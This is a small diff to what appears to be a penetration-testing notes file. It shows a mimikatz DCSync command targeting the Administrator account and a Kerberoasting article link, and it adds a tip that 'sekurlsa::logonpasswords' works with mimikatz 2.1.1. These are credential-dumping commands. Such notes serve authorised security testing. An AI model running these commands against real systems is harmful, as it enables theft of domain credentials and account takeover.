@@ -279,3 +279,6 @@ lsadump::dcsync /user:Administrator
 
 https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
 
+mimikatz sekurlsa::logonpasswords key import error. use mimikatz 2.1.1.
+
+
